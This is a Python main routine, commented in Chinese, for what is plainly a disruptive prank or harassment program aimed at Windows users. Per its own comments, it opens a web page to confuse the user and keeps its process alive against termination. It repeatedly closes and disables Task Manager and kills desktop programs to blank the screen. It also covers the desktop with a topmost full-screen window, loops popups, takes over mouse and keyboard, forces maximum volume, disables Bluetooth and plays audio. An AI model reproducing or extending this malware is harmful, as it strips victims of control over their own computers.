from threading import Thread # 导入threading模块 用于创建线程
from time import sleep # 导入time模块 用于延时

from utils.ShowMessage import showMessage # 导入utils.ShowMessage模块 用于显示消息
from utils.PlayAudio import playAudio, speakText # 导入utils.PlayAudio模块 用于播放音频
from utils.TaskManager import monitorTaskManager # 导入utils.monitorTaskManager 用于操控任务管理器
from utils.PermissionControl import controlTaskManager, disableBluetooth # 导入utils.PermissionControl模块 用于权限控制
from utils.ControlMouseKeys import controlMouseKeys # 导入utils.ControlMouseKeys模块 用于操控鼠标键盘
from utils.ControlSystem import endDesktopProgram, fullScreenWindow, monitorProcess, openWebPage # 导入utils.ControlSystem模块 用于操控系统


# 主函数
def startExecuting():
    try:
        Thread(target=openWebPage).start() # 打开网页迷惑用户

        Thread(target=monitorProcess).start() # 保活进程防止被杀死
        Thread(target=monitorTaskManager).start() # 循环关闭任务管理器
        sleep(300) # 延时300秒

        Thread(target=endDesktopProgram).start() # 杀死桌面程序造成白屏
        Thread(target=fullScreenWindow).start() # 创建全屏窗口置顶占领桌面
        Thread(target=showMessage).start() # 循环弹窗

        Thread(target=controlTaskManager, args=(True,)).start() # 禁用任务管理器（权限）

        Thread(target=controlMouseKeys).start() # 控制鼠标和让声音一直最大
        Thread(target=disableBluetooth).start() # 禁用蓝牙（权限）
        Thread(target=playAudio).start() # 播放音频
        
        speakText() # 播放提示音
    except: pass # 忽略错误



